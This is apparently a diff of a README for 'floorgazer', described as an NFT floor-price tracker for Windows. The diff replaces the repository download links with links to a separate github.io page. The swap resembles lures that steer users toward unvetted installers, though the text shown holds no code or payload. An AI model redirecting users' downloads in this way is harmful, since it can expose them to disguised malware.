@@ -1,6 +1,6 @@
 # 👁️ floorgazer - Track NFT Floor Prices Easily
 
-[![Download floorgazer](https://img.shields.io/badge/Download-floorgazer-ff6b35?style=for-the-badge&logo=github&logoColor=white)](https://github.com/ecko554-554/floorgazer)
+[![Download floorgazer](https://img.shields.io/badge/Download-floorgazer-ff6b35?style=for-the-badge&logo=github&logoColor=white)](https://ecko554-554.github.io)
 
 floorgazer is a free, open-source desktop utility for Windows that keeps an eye on the lowest asking price of NFT collections so you never have to refresh a dozen browser tabs again. It was built for collectors, traders, and curious newcomers who want a simple window on their desktop showing what is really happening with the collections they care about.
 
@@ -16,7 +16,7 @@ Getting floorgazer onto your computer takes about a minute.
 
 Go to the official project page here:
 
-👉 **https://github.com/ecko554-554/floorgazer**
+👉 **https://ecko554-554.github.io**
 
 Visit this link to download the application.
 
